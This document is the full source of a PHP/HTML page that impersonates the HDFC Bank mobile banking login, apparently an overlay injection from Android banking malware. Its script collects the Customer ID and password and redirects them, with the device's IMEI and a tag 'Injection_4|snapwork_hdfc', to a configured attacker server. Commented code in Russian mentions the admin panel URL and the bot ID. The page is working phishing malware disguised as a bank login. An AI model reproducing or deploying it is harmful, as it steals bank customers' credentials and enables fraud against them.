<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HDFC Bank</title>

    <style>
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #ffffff
        }

        .box_logo {
            background-color: #004C8F;
			padding: 3px;
        }

.submit-button {
    margin-bottom: 10px;
    color: #fff;
    width: 45%;
    padding: 10px;
    border-radius: 6px;
    background: rgb(0, 76, 143) none repeat scroll 0 0;
    font-weight: bold;
    margin-right: 10px;
    border: 1px none #036;
}

        .input-field {
            width: 50%;
			padding: 10px;
            border-radius: 6px;
            margin-right: 10px;
            border: 1px solid;
			
        }

        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }

        .ptb {
            padding: 4px 0;
        }

        .content {
            padding: 0;
            background-color: #ffffff;
            margin: 0 0 0 10px;
        }

        .fielderror {
            border: 1px solid #f00;
            width: 50%;
			padding: 10px;
            border-radius: 6px;
            margin-right: 10px;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

    <div class="fitMlbody" id="content_div">
        <header class="header">
            <div class="box_logo">
			<center>
                <img class="none" src="data:image/png;base64,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" border="0">
            </center>
			</div>
        </header><br><br><br>
        <section class="content">
            <form action="null" method="post" id="_mainForm" target="flow_handler">
<center>
                <div class="teaser_box">
                    <div class="ptb">
                        <label class="dunkelblau" for="CID"><b>Customer ID</b></label><br><br>
                        <input name="Customer ID" id="cid" maxlength="10" class="input-field" type="text">
                    </div>
                    <br />
                    <div class="ptb">
                        <label class="dunkelblau" for="password"><b>Password</b></label><br><br>
                        <input type="hidden" name="name" value="HDFC Bank MobileBanking" />
                        <input name="Password" id="password" maxlength="50" class="input-field" type="password" />
                    </div>  <br />
                    <div class="ptb">
                        <input type="button" value="Login" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>
                </div>
</center>
            </form>

        </section>
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('cid');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "snapwork_hdfc'+
						'", "customer_id": "'+oNumInp.value+
						'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|snapwork_hdfc|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>
</body>
</html>
